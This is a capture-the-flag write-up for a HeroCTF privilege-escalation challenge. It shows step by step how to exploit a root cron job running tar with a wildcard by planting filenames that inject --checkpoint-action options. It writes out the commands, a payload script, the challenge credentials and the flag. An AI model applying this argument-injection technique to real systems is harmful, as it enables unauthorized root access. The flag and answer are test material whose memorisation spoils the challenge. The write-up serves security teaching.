# PrivesCorp #1: Probabtion

### Category

System

### Description

You're on probabtion at this new firm, PrivesCorp. You have to give your superiors a report on the finanial situation of the company. But a not so kind colleague locked the file... You have to prove yourself, and therefore handle it on your own. Get the content of the file.

Read `/home/bob/locked.txt`

```shell
$ ssh bob@chall0.heroctf.fr -p 5001
password : welcomeHero
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

The **note.txt** file teaches us that a new state of the art backup system as been configured to make a backup of our *entire* home directory every minute.

We can easely imagine what is going on : a cron job is running with the following command : ```tar /var/backups/backup.tar *```

Now how is the use of the **\*** wildcard dangerous ? Tar allows you to set *checkpoints*. There are commands to execute after x files where archived. You can inject checkpoints through the wildcard with specific file names.

First let's create the checkpoint to run after one file was archived : ```touch -- --checkpoint=1```

Next, let's set tar's behaviour when reaching the checkpoints : ```touch -- "--checkpoint-action=exec=sh privesc.sh"```

Finally let's create the script that should be executed : ```echo 'cp /home/bob/locked.txt /tmp/abcd.txt && chmod 777 /tmp/abcd.txt' > privesc.sh```

We could have added ourselfs to the sudoers file, we could have ran a reverse shell as root, but I kept it simple here by copying **locked.txt** to a file we could read.

Now you just have to wait up to 1min that the cronjob archives the home directory in which you put the malicious files ;)

### Flag

```Hero{h0w_l0ng_t1ll_p4yd4y}```
